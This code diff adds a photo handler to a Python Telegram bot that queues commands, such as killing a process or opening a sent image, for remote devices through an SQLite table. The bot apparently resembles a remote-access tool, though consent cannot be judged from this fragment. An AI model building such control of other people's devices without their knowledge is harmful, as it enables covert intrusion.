@@ -72,7 +72,8 @@ class ServerBot:
             CommandHandler("start", self.start_command),
             CommandHandler("devices", self.list_devices_command),
             CallbackQueryHandler(self.callback_handler),
-            MessageHandler(filters.TEXT & (~filters.COMMAND), self.text_message_handler)
+            MessageHandler(filters.TEXT & (~filters.COMMAND), self.text_message_handler),
+            MessageHandler(filters.PHOTO, self.photo_message_handler)
         ])
 
     async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -190,6 +191,22 @@ class ServerBot:
                 conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                              (device_id, f"killprocess:{proc}"))
             await update.message.reply_text(f"Команда 'killprocess {proc}' отправлена устройству. Ожидайте...")
+            await self.show_devices_list(update.effective_chat.id)
+
+    async def photo_message_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        user_id = update.effective_user.id
+        if user_id not in ADMIN_IDS:
+            return
+        if 'open_image_device' in context.user_data:
+            device_id = context.user_data.pop('open_image_device')
+            photo = update.message.photo[-1]
+            file = await photo.get_file()
+            file_bytes = await file.download_as_bytearray()
+            img_b64 = base64.b64encode(file_bytes).decode('utf-8')
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, f"open_image:{img_b64}"))
+            await update.message.reply_text("Команда 'Открыть картинку' отправлена устройству. Ожидайте...")
             await self.show_devices_list(update.effective_chat.id)
 
     async def refresh_devices(self, chat_id):
